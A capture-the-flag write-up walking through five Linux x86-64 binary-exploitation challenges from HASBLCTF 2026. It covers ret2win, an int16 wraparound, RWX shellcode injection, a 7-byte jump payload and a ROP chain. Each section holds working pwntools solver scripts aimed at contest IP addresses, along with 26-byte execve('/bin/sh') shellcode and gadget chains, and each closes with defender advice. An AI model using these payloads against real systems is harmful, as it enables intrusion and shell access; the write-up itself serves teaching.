---
title: "HASBLCTF 2026 Pwn Writeup: All 5 Challenges Solved"
slug: "hasblctf-2026-pwn-writeup"
description: "HASBLCTF 2026 pwn writeup — all 5 binary exploitation challenges solved: ret2win, int16 wrap, shellcode injection, jmp rdx gadget chain, and ROP."
date: 2026-06-01T04:00:00Z
lastmod: 2026-08-04T10:00:00Z
draft: false
author: "CyberSecurity Elite Team"
categories: ["CTF Writeups"]
tags:
  - "hasblctf"
  - "hasbl ctf"
  - "ctf 2026"
  - "pwn"
  - "binary exploitation"
  - "buffer overflow"
  - "ret2win"
  - "stack alignment"
  - "integer overflow"
  - "signed overflow"
  - "shellcode"
  - "shellcoding"
  - "rop"
  - "rop chain"
  - "register shellcode"
  - "jmp rdx"
  - "linux exploitation"
  - "pwntools"
series: ["HASBL CTF 2026"]
keywords:
  - "hasblctf 2026 pwn writeup"
  - "hasblctf pwn writeup"
  - "hasbl ctf binary exploitation"
  - "hasblctf baby-bufferoverflow writeup"
  - "hasblctf candy-store writeup"
  - "hasblctf baby-shellcoder writeup"
  - "hasblctf jumper writeup"
  - "hasblctf padawan-pwn writeup"
  - "7-byte shellcode jmp rdx"
  - "pop rdi rsi rdx rop chain"
  - "ret2win strike flag.txt"
  - "ret2win stack alignment fix"
  - "movaps stack alignment pwn"
  - "int16 overflow ctf"
  - "signed unsigned comparison bug"
  - "pwn shellcode writeup"
  - "pwntools ret2win example"
  - "buy negative balance ctf"
  - "mmap rwx shellcode ctf"
  - "execve /bin/sh shellcode 26 bytes"
toc: true
cover:
  image: "/images/articles/hasblctf-2026-pwn-writeup.png"
  alt: "HASBLCTF 2026 pwn writeup — all 5 binary exploitation challenges (baby-bufferoverflow, candy-store, baby-shellcoder, jumper, padawan-pwn)"
---

{{< ctf-meta platform="HASBL CTF 2026" difficulty="Mixed (Easy → Medium)" os="Jeopardy — Pwn (Linux x86-64)" skills="ret2win with movaps stack alignment, int16 signed overflow, mmap RWX shellcode injection, register-controlled jmp into pre-built gadget chain, classic ROP with SysV-ABI argument-register setup, pwntools payload construction, checksec mitigation analysis" >}}

In this **CyberSecurity Elite** pwn writeup, we solve all five pwn challenges from **HASBLCTF 2026**, a multi-category jeopardy event with Reverse Engineering, Pwn, Web, and Forensics tracks. This writeup is dedicated to the **Pwn track** — the five pwn challenges (`baby-bufferoverflow`, `candy-store`, `baby-shellcoder`, `jumper`, `padawan-pwn`) were all solved, and each one teaches a different beginner-to-intermediate binary-exploitation primitive: ret2win with the `movaps` 16-byte stack-alignment trap, a signed-vs-unsigned integer-width bug exploitable via menu interaction, direct shellcode execution on an `mmap`'d RWX page, a 7-byte shellcode budget that has to set `rdx` for a hard-coded `jmp rdx` into the binary's own gadget chain, and a full ROP chain that loads three argument registers before calling a flag-printing function.

This is the master writeup for the pwn track. Each challenge below covers the binary's mitigations, the vulnerability, the exploit chain, and the recovered flag. Full per-challenge reproductions — solver scripts, disassembly listings, and pwntools payloads — live in the source repository: [Abdelkad3r/hasblctf-2026](https://github.com/Abdelkad3r/hasblctf-2026).

## The pwn track at a glance

| Challenge              | Target                                  | Mitigations                                | Core technique                                        |
|------------------------|-----------------------------------------|--------------------------------------------|-------------------------------------------------------|
| baby-bufferoverflow    | Linux x86-64 ELF, **not PIE**, NX, no canary | Partial RELRO, no canary, **no PIE**     | Ret2win at 40-byte offset + 1-gadget `ret` for 16-byte stack alignment |
| candy-store            | Linux x86-64 **PIE** ELF, dynamic       | Partial RELRO, NX, PIE                    | `int16_t` balance + signed `jg` comparison → wrap below INT16_MIN → buy flag |
| baby-shellcoder        | Linux x86-64 **PIE** ELF, dynamic       | NX on (irrelevant), `mmap` creates RWX page | 64-byte shellcode into mmap'd RWX page, `execve("/bin/sh")` |
| jumper                 | Linux x86-64 ELF, **stripped**, dynamic | Single RWX `PT_LOAD`, `mmap` page is RWX   | 7-byte shellcode: `mov edx, 0x401284` + 2× NOP → hard-coded `jmp rdx` lands in binary's pre-built gadget chain |
| padawan-pwn            | Linux x86-64 ELF, **not PIE**, NX, no canary | Partial RELRO, NX, **no PIE**, no canary | 40-byte BOF + ROP chain: `pop rdi/rsi/rdx` magic constants + alignment `ret` + `strike()` which prints `flag.txt` |

## Methodology — a pwn checklist

The general jeopardy framework (*recon → enumeration → exploitation → flag*) carries the engagement, but the pwn track has a more specific four-step shape:

1. **Triage.** `file` for arch/format, `checksec` for mitigations (PIE, canary, RELRO, NX), `strings` to find anything that looks like a `win` function or a flag-handling string (`flag.txt`, `printf("Here's your flag")`), `nm` to enumerate symbols. The mitigations row tells you what *kinds* of exploit are possible before you read a single instruction.
2. **Static analysis.** Find the input sink (`read`, `fgets`, `scanf`, `gets`), measure the offset to the saved return address from `rbp - <displacement>`, identify the win path (whether it's a hidden function, a syscall sled, or a primitive you build via ROP).
3. **Exploit development.** Build the payload in [pwntools](https://docs.pwntools.com/). For ret2win-class challenges, `p64(ret_gadget) + p64(win)` is the standard alignment fix on x86-64. For shellcode-class challenges, prefer 26-byte `execve("/bin/sh")` shellcode for maximum portability.
4. **Trigger and capture.** Send the payload, read the flag off the socket. For interactive challenges (`candy-store`'s menu loop), automate the protocol with `recvuntil`/`sendline`.

{{< callout type="info" title="checksec is the contract" >}}
Every pwn challenge starts with `checksec`. **No PIE** means fixed addresses for `win` and gadgets — you can hard-code them. **No canary** means stack BoF is reachable directly. **No RELRO / Partial RELRO** opens GOT overwrite. **No NX** would mean stack shellcode (rare in modern challenges). For HASBL CTF 2026 the five challenges split into two camps on PIE — `baby-bufferoverflow` and `padawan-pwn` are no-PIE (fixed addresses, ROP-friendly) while `candy-store`, `baby-shellcoder`, and `jumper` are PIE or use RWX-page primitives that sidestep ASLR entirely.
{{< /callout >}}

---

## baby-bufferoverflow — ret2win, but mind the `movaps`

```bash
$ file main
ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped

$ checksec --file=main
Partial RELRO | No canary found | NX enabled | No PIE
```

No PIE + no canary + a `read` that overflows. Two functions of interest:

```text
sym.win   @ 0x00401166    // opens flag.txt, reads, printfs it
main      @ 0x0040131d    // puts banner, read(0, buf @ rbp-0x20, 0x40)
```

### The vulnerability

`main`'s local buffer is 32 bytes (`rbp - 0x20`), but `read` accepts 64 bytes:

```nasm
sub   rsp, 0x20                       ; 32-byte local
lea   rsi, [buf = rbp-0x20]
mov   edx, 0x40                       ; 64 bytes!
call  read                            ; read(0, buf, 0x40)
leave
ret                                   ; <-- attacker controls RIP
```

Offset to saved RIP: **`0x20 (buffer) + 8 (saved rbp) = 40` bytes**. With no PIE, `win`'s address is fixed at `0x00401166`. Naïve exploit:

```python
payload = b"A"*40 + p64(0x00401166)   # ← SIGSEGVs
```

### The `movaps` trap

Returning *directly* into `win` SIGSEGVs inside `printf`. Why?

The x86-64 ABI requires `rsp` to be **16-byte aligned at the entry to a function**. When you `call` a function normally, `call` pushes the return address (8 bytes), which means inside the callee `rsp` is 16-aligned + 8 — i.e. 8-aligned only. The function's prologue typically does `push rbp; sub rsp, N` which restores 16-alignment.

When you `ret` *into* a function instead of `call`-ing it, you skip the `call`'s push. `rsp` is now off by 8 bytes from where the prologue expects it. The prologue still does `push rbp; sub rsp, N`, but `N` is chosen assuming the call adjusted alignment — so now `rsp` is misaligned at the moment `win` itself `call`s `printf`. Inside `printf`, the compiler emits `movaps xmm*, [rsp+offset]` to spill XMM registers, and `movaps` SIGSEGVs on misaligned addresses.

The fix is **one extra `ret` gadget** before `win` to absorb 8 bytes and restore the alignment:

```python
ret_gadget = 0x00401350   # any bare `ret` in the binary
win        = 0x00401166

payload = b"A"*40 + p64(ret_gadget) + p64(win)
```

```bash
$ ./solve.py
HASBL{B4BY_5H4RK5_F1R5T_0V3RFL0W}
```

**Flag:** `HASBL{B4BY_5H4RK5_F1R5T_0V3RFL0W}`

**Pwn takeaway:** every x86-64 ret2win after Ubuntu 18.04 needs the alignment gadget. The bug isn't your offset; it's `movaps`. Keep a *known-good `ret` gadget* address in your pwntools template, alongside the `win` address. The "challenge" of baby-bufferoverflow isn't finding the overflow — it's hitting the alignment fix on the first attempt.

**Defender takeaway:** if your binary needs to ship without PIE for any reason (debugging, legacy compatibility), enable canary and full RELRO. The combination *no PIE + no canary* is what makes the ret2win one-line. Enabling either would force the attacker into a leak primitive first.

---

## candy-store — int16 balance, signed-int comparison, buy the flag

```bash
$ file main
ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

A candy-shop menu. Start with $1337. Three items:

```text
1-  Chocolate:         $65
2-  Turkish Delight:   $250
3-  FLAG:           $32,400
4-  Exit
```

Choices 1 and 2 only *subtract* from your balance. Choice 3 gates on `bal > 32399`. The naïve read says it's unsolvable — you can never get rich enough to afford the flag.

### The vulnerability

The balance is stored as **`int16_t`** but printed as `int`:

```c
int16_t bal = 1337;
if (choice == 1) bal -= 65;       // chocolate
if (choice == 2) bal -= 250;      // turkish delight
if (choice == 3) {
    if (bal > 32399 /* signed comparison */) {
        bal -= 32400;
        win();
    }
}
printf("[!] Current balance: %d\n", (int)bal);   // sign-extended
```

The disassembly confirms it:

```nasm
mov  word [var_2h], 0x539     ; bal = 1337 (16-bit word)
...
mov  ax, word [var_2h]
sub  ax, 0xfa                 ; -250 (turkish delight)
mov  word [var_2h], ax
...
cmp  word [var_2h], 0x7E8F    ; compare 16-bit balance against 32399
jg   .buy_flag                ; SIGNED jg
...
movsx eax, word [var_2h]      ; sign-extend int16 -> int32 for printf
```

### The exploit — make the balance wrap

`int16_t` ranges `[-32768, 32767]`. Subtract enough that the balance dips below `INT16_MIN`; the next store wraps it into the high-positive half of the range. Specifically, you want the final value to land in `[32400, 32767]` so the signed `jg 0x7E8F` passes.

Solve the modular equation: `(1337 − K) mod 65536 ∈ [32400, 32767]` means `K ∈ [34106, 34473]`.

Turkish Delights at $250 each: `250 × 137 = 34250 ∈ [34106, 34473]` ✓.

So **137 Turkish Delights** wraps the balance to `(1337 − 34250) mod 65536 = +32623`. Then send choice `3`:

```python
from pwn import remote
io = remote("34.77.68.154", 10003)
for _ in range(137):
    io.sendlineafter(b"choice", b"2")     # Turkish Delight
io.sendlineafter(b"choice", b"3")         # buy FLAG
print(io.recvall(timeout=2).decode())
# HASBL{Turk1sh_D3l1ght_15_Th3_B35t}
```

**Flag:** `HASBL{Turk1sh_D3l1ght_15_Th3_B35t}`

**Pwn takeaway:** when a numeric field is stored at one width but compared and printed at a wider width, you have a *type-confusion* bug at every comparison and every display. The printed value sign-extends from `int16` to `int`, which means the menu UI *honestly shows you* the wrapped negative balance after the underflow — you just keep buying past it until the wrap lands you in the win region.

**Defender takeaway:** in C/C++ code, never mix integer widths in security-relevant comparisons. The `<stdint.h>` discipline (`int32_t`, `uint16_t`) plus `-Wsign-compare` plus `-Wconversion` catches most of these at compile time. In Rust, the type system rejects the mixed comparison outright. Use one of those.

---

## baby-shellcoder — the binary builds the runway

```bash
$ file main
ELF 64-bit LSB pie executable, x86-64, dynamically linked, not stripped
```

The "vulnerability" isn't really a vulnerability — the binary actively hands you the keys. Its `main` is six lines of C:

```c
int main(void) {
    void *addr = mmap(NULL, 0x40,
                      PROT_READ|PROT_WRITE|PROT_EXEC,   // 7
                      MAP_PRIVATE|MAP_ANONYMOUS,        // 0x22
                      -1, 0);
    if (addr == MAP_FAILED) { perror("mmap failed: "); return -1; }
    puts("Kept you waiting huh?");
    read(0, addr, 0x40);
    ((void(*)())addr)();        // ← user's 64 bytes run as code
    munmap(addr, 0x40);
    return 0;
}
```

`prot = 7` is the smoking gun — `PROT_READ | PROT_WRITE | PROT_EXEC`. The mmap'd page is RWX even if the stack is NX. Read 64 bytes from stdin into it, `call rdx` jumps in.

### The exploit — 26 bytes of `execve("/bin/sh")`

The classic Linux x86-64 shellcode for `execve("/bin/sh", NULL, NULL)` is 26 bytes — well under the 64-byte budget. No bad-byte filter, no alignment requirement we care about, no register state we need to preserve.

```nasm
xor    rsi, rsi                       ; envp = NULL
push   rsi                            ; '\0' terminator for "/bin/sh"
movabs rdi, 0x0068732f6e69622f        ; "/bin/sh\0" (LE)
push   rdi
mov    rdi, rsp                       ; argv = ptr to "/bin/sh"
push   rsi                            ; argv[1] = NULL
push   rdi                            ; argv[0] = "/bin/sh"
mov    rsi, rsp                       ; rsi = argv
xor    rdx, rdx                       ; envp = NULL
mov    al, 0x3b                       ; syscall 59 = execve
syscall
```

The wrapper around the service is socat-style — stdin/stdout/stderr are the socket — so the shell pops live on the same connection. `cat flag.txt` returns the flag.

```python
from pwn import remote, asm, context
context.arch = "amd64"

shellcode = asm("""
    xor   rsi, rsi
    push  rsi
    movabs rdi, 0x0068732f6e69622f
    push  rdi
    mov   rdi, rsp
    push  rsi
    push  rdi
    mov   rsi, rsp
    xor   rdx, rdx
    mov   al, 0x3b
    syscall
""")

io = remote("34.77.68.154", 10002)
io.recvuntil(b"huh?")
io.send(shellcode.ljust(0x40, b"\x90"))
io.sendline(b"cat flag.txt")
print(io.recvline().decode())
# HASBL{K3PT_Y0U_W41T1NG_HUH}
```

**Flag:** `HASBL{K3PT_Y0U_W41T1NG_HUH}`

**Pwn takeaway:** the four `mmap` constants (`length`, `prot`, `flags`, `fd`) tell you everything before you read any instructions. `prot = 7` means W^X has been explicitly broken; `flags = 0x22` (`MAP_PRIVATE | MAP_ANONYMOUS`) means the page is a clean anonymous mapping; `fd = -1` confirms anonymous. The follow-up `call rdx` after `read` into that page is the launch ramp. When you see these four constants together, you don't need to find an exploit — you write the code that runs.

**Defender takeaway:** if your application legitimately needs JIT, `mprotect` between W and X — never both. The 2026 surface includes browsers, .NET, JVM, V8, sqlite-r1, and several anti-cheat systems, all of which toggle W^X around code generation. Static RWX pages are a 20-year-old anti-pattern.

---

## jumper — 7-byte shellcode that sets `rdx` for a hard-coded `jmp rdx`

```bash
$ file jumper
ELF 64-bit LSB executable, x86-64, dynamically linked, stripped
```

A stripped Linux ELF whose one trick is **the shellcode budget is 7 bytes**, and the binary then patches its own `jmp rdx` (opcode `ff e2`) at offset 7. The 7 bytes you control are followed by an indirect jump through whatever `rdx` happens to contain at that moment.

### `main`'s 9-byte runway

```nasm
; mmap(NULL, 9, PROT_R|W|X, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0)
mov   edx, 0x07              ; prot
mov   esi, 9                 ; length
call  mmap@plt

; memset(page, 0, 9)
call  memset@plt

; read(0, page, 7)              ← attacker's 7 bytes
mov   edx, 7
call  read@plt

; page[7] = 0xff
; page[8] = 0xe2               ← `jmp rdx`
mov   byte [rax + 7], 0xff
mov   byte [rax + 8], 0xe2

; call page
call  rax
```

The page layout at the moment of `call rax`:

```text
+--------+----------------------+
| 0..6   | 7 attacker bytes     |
+--------+----------------------+
| 7..8   | ff e2  (jmp rdx)     |
+--------+----------------------+
```

### What is `rdx` right then?

The last write to `rdx` was the `mov edx, 7` before the `read` call. Glibc's `read` PLT trampoline doesn't write back to `rdx` after returning, so when control reaches the patched `jmp rdx`, `rdx` is still **`7`**. Jumping to absolute address `7` is an instant SIGSEGV.

So the 7 attacker bytes have to **load a useful value into `rdx`** before the patched jump fires.

### What's at a useful address?

The binary's single `PT_LOAD` segment is mapped **R|W|E** — the entire `.text` is executable *and* writable. Reading the `.text` disassembly with `objdump -d` reveals a hand-built shellcode chain whose blocks are independently disassemblable. The chain's entry point is `0x401284`; running through it ends in `execve("/bin/sh", NULL, NULL)`.

### The 7-byte payload

```text
ba 84 12 40 00      mov edx, 0x401284
90 90               nop ; nop                ; padding to 7 bytes
                    --- binary patches ff e2 here ---
                    jmp rdx → 0x401284
```

```python
from pwn import remote, asm, context
context.arch = "amd64"

payload = asm("mov edx, 0x401284") + b"\x90\x90"   # 7 bytes exactly
assert len(payload) == 7

io = remote("34.77.68.154", 10004)
io.send(payload)
io.sendline(b"cat flag.txt")
print(io.recvline().decode())
# HASBL{C4N_Y0U_FLY?_N0_JUMP_G00D}
```

**Flag:** `HASBL{C4N_Y0U_FLY?_N0_JUMP_G00D}`

**Pwn takeaway:** when a binary hands you an indirect jump primitive through a CPU register, **the value the register held going into the primitive is part of the API**. Tracing `rdx`'s last write through `main` (the third `mov` argument to `read`) tells you the default landing site (`7`, instant crash) which then tells you the actual challenge: rewrite `rdx` in your 7-byte budget. The whole binary being one big RWX `PT_LOAD` with a pre-staged gadget chain is the "trampoline" — the author built a runway you have to taxi onto.

**Defender takeaway:** never mark `.text` writable in production. The single-RWX-`PT_LOAD` pattern shows up in some obfuscators and in JIT-heavy applications that take shortcuts; in both cases, an indirect-jump primitive plus a known register state turns the whole binary into a gadget store.

---

## padawan-pwn — classic ROP chain into a flag-printing function

```bash
$ file padawan
ELF 64-bit LSB, x86-64, not stripped

$ nm padawan | grep ' [Tt] '
0000000000401186 T strike      ← opens flag.txt and printfs it
000000000040133f T main
00000000004013b0 T attack      ← contains pop-gadgets
00000000004013c1 T dodge       ← contains pop-gadgets
00000000004013d9 T finish      ← contains pop-gadgets
```

NX on, no PIE, no canary, not stripped, plus several invitingly-named functions that aren't called from anywhere. Those uncalled functions are the **gadget mines** — the author hid pop-reg gadgets inside dummy story functions.

### The overflow

```nasm
401346:  subq    $0x20, %rsp            ; 32-byte buffer at [rbp-0x20]
…banner…
401376:  movl    $0x80, %edx            ; read 128 bytes
40137e:  callq   read@plt               ; into a 32-byte buffer
```

128-byte read into a 32-byte buffer. Stack layout from `rbp`:

```text
rbp - 0x20  +----------------+ ← buf (32 bytes)
            |  user input    |
rbp + 0x00  +----------------+ ← saved rbp (8 bytes)
rbp + 0x08  +----------------+ ← saved rip (8 bytes; hijack here)
            |  caller frame  |
            +----------------+
```

**Offset to saved RIP: `0x20 + 8 = 40` bytes.**

### The win function — `strike(rdi, rsi, rdx)`

`strike` saves its three argument registers, then `open("flag.txt", O_RDONLY)`, `read(fd, buf, 0x100)`, `puts(buf)`. The arguments aren't actually *used* for anything functional in the path that prints the flag — they're a flavour gate, set to magic constants in the brief's story. The author wants you to load `rdi=0xDEADCAFE`, `rsi=0xCAFEBABE`, `rdx=0xDEADC0DE` even though `strike` doesn't strictly require them.

### Gadgets hidden in dummy functions

```text
0x4013bf:  pop rdi ; ret
0x4013c0:  ret                ← alignment gadget
0x4013d7:  pop rsi ; ret
0x4013de:  pop rdx ; ret
```

Standard `ropper` / `ROPgadget` output finds these instantly. The bare `ret` at `0x4013c0` is the 16-byte alignment fix discussed in `baby-bufferoverflow`.

### The ROP chain

```text
[ 40 bytes 'A' padding              ]
[ 0x4013bf  pop rdi ; ret          ]
[ 0xDEADCAFE                       ]
[ 0x4013d7  pop rsi ; ret          ]
[ 0xCAFEBABE                       ]
[ 0x4013de  pop rdx ; ret          ]
[ 0xDEADC0DE                       ]
[ 0x4013c0  ret  (alignment)       ]
[ 0x401186  strike                 ]
```

In pwntools:

```python
from pwn import remote, p64

PADDING       = b"A" * 40
POP_RDI       = p64(0x4013bf)
POP_RSI       = p64(0x4013d7)
POP_RDX       = p64(0x4013de)
ALIGN_RET     = p64(0x4013c0)
STRIKE        = p64(0x401186)

payload  = PADDING
payload += POP_RDI + p64(0xDEADCAFE)
payload += POP_RSI + p64(0xCAFEBABE)
payload += POP_RDX + p64(0xDEADC0DE)
payload += ALIGN_RET
payload += STRIKE

io = remote("34.77.68.154", 10005)
io.recvuntil(b"what you got:")
io.sendline(payload)
print(io.recvall(timeout=2).decode())
# HASBL{M4Y_7H3_F0RC3_B3_W17H_Y0U}
```

**Flag:** `HASBL{M4Y_7H3_F0RC3_B3_W17H_Y0U}`

**Pwn takeaway:** classic ROP is *just a list of return addresses* interleaved with the values those gadgets pop. Each `pop reg ; ret` consumes 8 bytes of stack for its data; chain enough of them, then end with the win function's address. The SysV ABI maps argument registers `rdi, rsi, rdx, rcx, r8, r9` — the first three are the most common chain targets. Hidden uncalled functions (`attack`, `dodge`, `finish`) being gadget mines is a recurring CTF design pattern — they exist *only* to ship the gadgets without spending real stack frames on them.

**Defender takeaway:** the *combination* no-PIE + no-canary + uncalled-functions-with-`pop-reg-ret`-suffixes is a guaranteed ROP target. Strip dead functions at link time (`-Wl,--gc-sections` plus `-ffunction-sections -fdata-sections`); enable PIE so addresses aren't predictable; enable stack canaries so the overflow has to leak first.

---

## Lessons learned — what HASBLCTF 2026 pwn rewarded

Six patterns recur across these five pwn solves; they're the meat of the early pwn curriculum:

1. **`checksec` is the *first* tool, not the last.** The mitigation row decides which exploit class is even possible. `baby-bufferoverflow` and `padawan-pwn`'s no-PIE-no-canary opens the door for ret2win and ROP; `candy-store`'s PIE doesn't matter because the bug is logical, not corruption-based; `baby-shellcoder` and `jumper` make mitigations irrelevant by `mmap`-ing their own RWX pages.
2. **The `movaps` 16-byte alignment is the one detail beginners miss.** Every modern x86-64 ret2win needs a single bare-`ret` gadget before the `win` address — and the same fix recurs in `padawan-pwn`'s ROP chain. Bake it into your pwntools template; you'll thank yourself on the next CTF.
3. **Integer width is a security boundary.** `candy-store` is not a stack-corruption challenge — it's a type-confusion challenge dressed up as a candy shop. The `int16_t` balance + signed `jg` + `int`-cast display is the same class of bug that hit OpenSSL's `length` checks for years.
4. **Read `mmap`'s arguments before you read its caller.** Four constants — `length, prot, flags, fd` — describe the security posture of the page in one line. `PROT_EXEC` set + `MAP_ANONYMOUS` set + `fd=-1` means "the binary built the shellcode runway for you." `baby-shellcoder` and `jumper` are both built on this pattern; that pattern recurs in commercial software too, in JIT engines and game anti-cheats, and the assessment template is identical.
5. **Indirect jumps consume *whichever register the caller left set*.** `jumper`'s patched `jmp rdx` is the whole challenge: the binary loads `edx = 7` to call `read`, glibc never writes back to `rdx`, so the indirect jump lands at absolute address `7` (SIGSEGV) unless you spend your 7-byte budget rewriting `rdx`. Whenever a binary uses register-controlled indirect jumps, treat the register state at the jump point as a *contract* you need to forge.
6. **ROP is a list of return addresses.** `padawan-pwn`'s chain is `pop rdi; ret` → constant → `pop rsi; ret` → constant → `pop rdx; ret` → constant → alignment `ret` → `strike()`. Each gadget consumes 8 bytes of stack for its operand; chain them and end with the win function. Uncalled functions in the symbol table (`attack`, `dodge`, `finish`) are gadget mines, not story content.

## Source repository

Every per-challenge writeup includes pwntools solver scripts, full disassembly listings, and the alignment / wrap / shellcode payload notes:

**Repo:** [github.com/Abdelkad3r/hasblctf-2026](https://github.com/Abdelkad3r/hasblctf-2026)

The repo also contains the [reverse engineering](/ctf-writeups/hasblctf-2026-reverse-engineering-writeup/), forensics (`Quick Response`, `Logo`, `Digits`, `pamuk`, `magic-numbers`), and web (`T/I Forum`, `Anatolian Atlas`) writeups from the same event. This article is scoped to the pwn category only.

If you're building a pwn learning progression from this writeup, the three challenges form a clean order: **baby-shellcoder (no mitigations matter) → baby-bufferoverflow (one mitigation gap + alignment trap) → candy-store (logic bug, no corruption needed)**. That order maps to *"see the runway"* → *"build the runway"* → *"abuse the rules of the road."*

{{< faq >}}
[
  {
    "q": "What is HASBL CTF 2026?",
    "a": "HASBL CTF 2026 is a multi-category jeopardy-style capture-the-flag competition covering Reverse Engineering, Pwn, Web, and Forensics. The flag prefix is HASBL{...} for every challenge. This writeup is dedicated to the Pwn track only."
  },
  {
    "q": "How many pwn challenges does HASBL CTF 2026 have?",
    "a": "Five pwn challenges in this writeup's scope: baby-bufferoverflow, candy-store, baby-shellcoder, jumper, and padawan-pwn. All five were solved and are documented here. The full event also includes reverse engineering, web, and forensics tracks covered separately in the source repository."
  },
  {
    "q": "Where can I find the HASBL CTF 2026 pwn solver scripts?",
    "a": "All five per-challenge writeups, pwntools solver scripts, and disassembly listings live in the source repository at github.com/Abdelkad3r/hasblctf-2026 under the pwn/ directory. Each challenge has its own README and standalone solver."
  },
  {
    "q": "How is the baby-bufferoverflow challenge solved?",
    "a": "The binary has no PIE, no canary, and a read of 64 bytes into a 32-byte buffer. The offset to the saved return address is 40 bytes. A direct ret-to-win SIGSEGVs because of the x86-64 16-byte stack alignment requirement at function entry — printf's movaps instruction crashes on a misaligned rsp. Adding one bare ret gadget before the win address absorbs 8 bytes and restores alignment. Payload: 40 padding bytes + ret_gadget + win_addr. Flag is HASBL{B4BY_5H4RK5_F1R5T_0V3RFL0W}."
  },
  {
    "q": "What is the movaps stack alignment fix in ret2win exploits?",
    "a": "The x86-64 ABI requires rsp to be 16-byte aligned at function entry. The CALL instruction pushes 8 bytes, so functions assume rsp is 16-aligned plus 8 at entry and adjust accordingly. When you RET into a function instead of CALL-ing it, you skip that push, so rsp is off by 8. Printf and other libc functions use movaps to spill XMM registers, and movaps SIGSEGVs on misaligned addresses. The fix is to chain one bare 'ret' gadget before the win function to absorb the 8 bytes and restore alignment."
  },
  {
    "q": "How is the candy-store challenge solved?",
    "a": "The shop's balance is stored as int16_t but compared with a signed jg and printed as int. Buying 137 Turkish Delights at $250 each subtracts 34,250 from the starting balance of $1337 — that wraps the int16 from 1337 around through INT16_MIN into +32,623. Since 32,623 is greater than 32,399 under signed comparison, the FLAG purchase (choice 3) succeeds and win() prints the flag. Flag is HASBL{Turk1sh_D3l1ght_15_Th3_B35t}."
  },
  {
    "q": "What is the integer overflow bug in candy-store?",
    "a": "A signed-vs-unsigned and width-mismatch bug. The balance variable is 16-bit but the comparison sign-extends and the printf cast widens to 32-bit. Buying enough cheap items to push the balance below INT16_MIN wraps it into the high positive range, where the signed jg check incorrectly accepts the purchase. Classic CWE-190 (integer overflow) plus CWE-197 (numeric truncation error)."
  },
  {
    "q": "How is the baby-shellcoder challenge solved?",
    "a": "The binary mmaps a 64-byte page with PROT_READ|PROT_WRITE|PROT_EXEC, reads 64 bytes from stdin into it, then calls into it. Standard execve('/bin/sh') shellcode is 26 bytes — fits with room to spare. Send the shellcode, NOP-pad to 64 bytes, then send 'cat flag.txt' on the shell that pops. The challenge tests pure shellcoding skill, not exploit discovery. Flag is HASBL{K3PT_Y0U_W41T1NG_HUH}."
  },
  {
    "q": "What is the 26-byte execve shellcode used for baby-shellcoder?",
    "a": "The standard Linux x86-64 execve('/bin/sh', NULL, NULL) shellcode: xor rsi,rsi; push rsi; movabs rdi,0x0068732f6e69622f; push rdi; mov rdi,rsp; push rsi; push rdi; mov rsi,rsp; xor rdx,rdx; mov al,0x3b; syscall. The string '/bin/sh\\0' is encoded as the little-endian qword 0x0068732f6e69622f. Total length 26 bytes. Works because the service's stdin/stdout are wired to the same socket, so the popped shell talks back to you directly."
  },
  {
    "q": "How is the jumper challenge solved?",
    "a": "The binary mmaps a 9-byte RWX page, reads 7 bytes from stdin into it, patches a hard-coded jmp rdx (opcode ff e2) at offsets 7-8, then calls into the page. The last write to rdx before the indirect jump was 'mov edx, 7' for the read syscall, so rdx is 7 at jump time — jumping to absolute address 7 is a SIGSEGV. The fix is to spend the 7-byte budget loading rdx with 0x401284, which is the entry point of a pre-built execve('/bin/sh') gadget chain in the binary's own .text. Payload: ba 84 12 40 00 (mov edx, 0x401284) followed by two NOPs. Flag is HASBL{C4N_Y0U_FLY?_N0_JUMP_G00D}."
  },
  {
    "q": "How is the padawan-pwn ROP chain built?",
    "a": "Classic stack BOF — 32-byte buffer with a 128-byte read, so 40 bytes pad to the saved RIP. The win function strike() opens flag.txt and prints it, but the brief wants you to load rdi=0xDEADCAFE, rsi=0xCAFEBABE, rdx=0xDEADC0DE first. Three pop gadgets are hidden inside uncalled dummy functions (attack, dodge, finish): pop rdi;ret at 0x4013bf, pop rsi;ret at 0x4013d7, pop rdx;ret at 0x4013de. Chain them with their operands, add a bare ret at 0x4013c0 for movaps alignment, then call strike at 0x401186. Total payload is 40 padding + 3×(gadget+constant) + alignment + strike. Flag is HASBL{M4Y_7H3_F0RC3_B3_W17H_Y0U}."
  },
  {
    "q": "Where do you find ROP gadgets in padawan-pwn?",
    "a": "Inside the dummy functions attack/dodge/finish, which are listed in the symbol table but never called from main. The author put pop-reg-ret gadget bytes at the function tails so the gadgets exist without consuming real stack frames. Standard tools (ROPgadget --binary padawan or ropper -f padawan) find them in a second. The combination 'no PIE + no canary + uncalled functions with pop-reg-ret suffixes' is a guaranteed ROP target by construction."
  },
  {
    "q": "Are HASBL CTF pwn challenges beginner-friendly?",
    "a": "Yes — the five form a clean intro-pwn curriculum. baby-shellcoder is the simplest (the binary hands you an RWX page). baby-bufferoverflow teaches the canonical ret2win with the movaps alignment fix. candy-store moves beyond memory corruption into logic and integer-width bugs. jumper constrains shellcode to 7 bytes and teaches register-state-as-API. padawan-pwn introduces classic ROP-chain construction with SysV-ABI argument registers. Progression: baby-shellcoder → baby-bufferoverflow → candy-store → jumper → padawan-pwn."
  },
  {
    "q": "What pwntools features are needed for these challenges?",
    "a": "Standard pwntools: from pwn import remote, p64, context, asm. baby-bufferoverflow uses p64 for the payload bytes. baby-shellcoder and jumper use pwntools.asm to assemble shellcode at runtime (set context.arch='amd64' first). candy-store uses sendlineafter to navigate the menu in a loop. padawan-pwn introduces ROP-chain construction — p64 of each gadget address interleaved with p64 of each constant. libc leaks and advanced heap manipulation are not required for any of the five."
  }
]
{{< /faq >}}
